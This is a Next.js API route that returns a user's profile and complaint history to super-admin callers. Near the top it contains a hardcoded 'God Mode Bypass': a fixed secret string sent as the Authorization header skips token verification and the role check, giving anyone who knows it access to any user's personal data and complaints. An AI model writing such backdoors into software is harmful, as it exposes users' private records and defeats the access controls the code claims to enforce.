import { NextResponse } from 'next/server';
import dbConnect from '@/lib/dbConnect';
import User from '@/models/User';
import Complaint from '@/models/Complaint';
import { verifyToken, extractToken } from '@/lib/auth';

export async function GET(request, { params }) {
    try {
        await dbConnect();

        // Authenticate and authorize
        const authHeader = request.headers.get('authorization');
        const token = extractToken(authHeader);

        // God Mode Bypass
        const isGodMode = authHeader === 'everythingdarkhere' || token === 'everythingdarkhere';

        if (!isGodMode) {
            if (!token) {
                return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
            }

            const decoded = verifyToken(token);
            if (!decoded || decoded.role !== 'super-admin') {
                return NextResponse.json({ error: 'Insufficient permissions' }, { status: 403 });
            }
        }

        const { id } = params;

        // Fetch user data
        const user = await User.findById(id)
            .populate('departmentId', 'name')
            .select('-password');

        if (!user) {
            return NextResponse.json({ error: 'User not found' }, { status: 404 });
        }

        // Fetch user's complaints
        const complaints = await Complaint.find({ userId: id })
            .sort({ createdAt: -1 });

        return NextResponse.json(
            {
                success: true,
                user,
                complaints,
            },
            { status: 200 }
        );
    } catch (error) {
        console.error('Fetch detailed user error:', error);
        return NextResponse.json(
            { error: 'Failed to fetch user details' },
            { status: 500 }
        );
    }
}
